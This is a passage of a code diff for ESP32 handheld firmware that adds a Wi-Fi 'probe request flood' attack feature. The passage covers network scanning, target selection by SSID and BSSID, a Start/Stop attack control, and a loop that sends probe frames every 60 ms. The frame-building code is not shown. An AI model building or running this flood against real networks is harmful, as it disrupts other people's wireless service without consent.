+    char buf[64];
+    tft.setTextColor(WHITE);
+    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
+    tft.setCursor(10, 50);
+    tft.println(buf);
+
+    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
+             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
+    tft.setCursor(10, 70);
+    tft.println(buf);
+
+    const char* auth;
+    switch (selectedAp.authmode) {
+        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
+        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
+        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
+        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
+        default: auth = "Unknown"; break;
+    }
+    snprintf(buf, sizeof(buf), "Auth: %s", auth);
+    tft.setCursor(10, 85);
+    tft.println(buf);
+
+    tft.setCursor(10, 100);
+    tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
+    tft.println(attack_running ? "Status: Running" : "Status: Stopped");
+
+    snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
+    tft.setCursor(10, 115);
+    tft.setTextColor(WHITE);
+    tft.println(buf);
+
+    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
+    snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
+    tft.setCursor(10, 130);
+    tft.println(buf);
+
+    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
+    tft.setCursor(10, 145);
+    tft.println(buf);
+
+    const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
+    drawTabBar(buttons[0], false, "", true, buttons[1], false);
+}
+
+void handleTouch() {
+    int x, y;
+    if (!readTouchXY(x, y)) return;
+
+    bool redraw = false;
+    if (selected_ap_index == -1) {
+        const int listMaxY = LIST_FIRST_ROW_Y + (networks_per_page * LIST_ROW_H);
+        if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && network_count > 0) {
+            int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * networks_per_page);
+            if (index >= 0 && index < network_count) {
+                selected_ap_index = index;
+                selectedAp = ap_list[index];
+                selectedChannel = ap_list[index].primary;
+                drawScanScreen();
+                delay(50);
+                drawAttackScreen();
+            }
+        } else if (!scanning && y >= 290 && y <= 320) {
+            if (attack_running) {
+                if (x >= 0 && x <= 57) {
+                    drawButton(0, 304, 57, 16, "Stop Attack", true, false);
+                    attack_running = false;
+                    last_packet_time = 0;
+                    drawScanScreen();
+                    delay(50);
+                    redraw = true;
+                } else if (x >= 122 && x <= 179) {
+                    drawButton(122, 304, 57, 16, "Rescan", true, false);
+                    delay(50);
+                    if (scanNetworks()) {
+                        drawScanScreen();
+                    }
+                    redraw = true;
+                }
+            } else {
+                if (x >= 0 && x <= 57) {
+                    drawButton(0, 304, 57, 16, "Rescan", true, false);
+                    delay(50);
+                    if (scanNetworks()) {
+                        drawScanScreen();
+                    }
+                    redraw = true;
+                } else if (x >= 122 && x <= 179) {
+                    if (current_page > 0) {
+                        drawButton(117, 304, 57, 16, "Prev", true, false);
+                        current_page--;
+                        drawScanScreen();
+                        delay(50);
+                        redraw = true;
+                    }
+                } else if (x >= 183 && x <= 240) {
+                    if ((current_page + 1) * networks_per_page < network_count) {
+                        drawButton(178, 304, 57, 16, "Next", true, false);
+                        current_page++;
+                        drawScanScreen();
+                        delay(50);
+                        redraw = true;
+                    }
+                }
+            }
+        }
+    } else {
+        if (y >= 290 && y <= 320) {
+            if (x >= 0 && x <= 57) {
+                drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
+                attack_running = !attack_running;
+                if (!attack_running) {
+                    last_packet_time = 0;
+                }
+                drawAttackScreen();
+                delay(50);
+                redraw = true;
+            } else if (x >= 183 && x <= 240) {
+                drawButton(177, 304, 57, 16, "Back", true, false);
+                attack_running = false;
+                last_packet_time = 0;
+                selected_ap_index = -1;
+                drawScanScreen();
+                delay(50);
+                redraw = true;
+            }
+        }
+    }
+
+    if (redraw) {
+        delay(100);
+    }
+}
+
+void runUI() {
+#define SCREEN_WIDTH  240
+#define SCREENHEIGHT 320
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 2
+
+  static int iconX[ICON_NUM] = {220, 10};
+  static int iconY = STATUS_BAR_Y_OFFSET;
+
+  static const unsigned char* icons[ICON_NUM] = {
+    bitmap_icon_undo,
+    bitmap_icon_go_back
+  };
+
+  if (!uiDrawn) {
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
+    uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+  static unsigned long lastSpamTime = 0;
+
+  switch (animationState) {
+    case 0:
+      break;
+
+    case 1:
+      if (millis() - lastAnimationTime >= 150) {
+        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+        animationState = 2;
+        lastAnimationTime = millis();
+      }
+      break;
+
+    case 2:
+      if (millis() - lastAnimationTime >= 200) {
+        animationState = 3;
+        lastAnimationTime = millis();
+      }
+      break;
+
+    case 3:
+      switch (activeIcon) {
+        case 0:
+          scanNetworks();
+          delay(50);
+          if (scanNetworks()) {
+            drawScanScreen();
+           }
+          animationState = 0;
+          activeIcon = -1;
+          break;
+      }
+      break;
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  const unsigned long touchCheckInterval = 50;
+
+  if (millis() - lastTouchCheck >= touchCheckInterval) {
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
+            if (icons[i] != NULL && animationState == 0) {
+
+              if (i == 1) {
+                feature_exit_requested = true;
+              } else {
+
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+void probeRequestFloodSetup() {
+
+    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+
+    setupTouchscreen();
+    uiDrawn = false;
+
+    float currentBatteryVoltage = readBatteryVoltage();
+    drawStatusBar(currentBatteryVoltage, true);
+    runUI();
+
+    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+
+    tft.setTextColor(GREEN, BLACK);
+    tft.setTextSize(1);
+    tft.setCursor(10, 50);
+    tft.println("Initializing...");
+
+    attack_running     = false;
+    selected_ap_index  = -1;
+    current_page       = 0;
+    scanning           = false;
+
+    int bgCount = WiFi.scanComplete();
+    if (bgCount > 0) {
+
+        if (ap_list) {
+            free(ap_list);
+            ap_list = nullptr;
+        }
+
+        network_count = bgCount;
+        ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
+        if (ap_list) {
+            for (int i = 0; i < network_count; i++) {
+                wifi_ap_record_t ap_record = {0};
+                memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
+                strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
+                ap_record.ssid[sizeof(ap_record.ssid) - 1] = '\0';
+                ap_record.rssi    = WiFi.RSSI(i);
+                ap_record.primary = WiFi.channel(i);
+                ap_record.authmode = WiFi.encryptionType(i);
+                ap_list[i] = ap_record;
+            }
+
+            qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
+        } else {
+
+            network_count = 0;
+        }
+    } else {
+
+        scanNetworks();
+    }
+
+    drawScanScreen();
+
+    drawScanScreen();
+}
+
+void probeRequestFloodLoop() {
+
+    if (feature_active && isButtonPressed(BTN_SELECT)) {
+        feature_exit_requested = true;
+        return;
+    }
+
+    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+
+    handleTouch();
+    updateStatusBar();
+    runUI();
+
+    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
+
+    uint32_t current_time = millis();
+    if (attack_running && selected_ap_index != -1) {
+        uint32_t heap = ESP.getFreeHeap();
+        if (heap < 80000) {
+            attack_running = false;
+            last_packet_time = 0;
+            drawAttackScreen();
+            delay(3000);
+            return;
+        }
+
+        if (consecutive_failures > 10) {
+            resetWifi();
+            last_packet_time = 0;
+            delay(3000);
+            return;
+        }
+
+        if (current_time - last_packet_time >= 60 && attack_running) {
+            sendProbeFrame();
             last_packet_time = current_time;
         }
     }
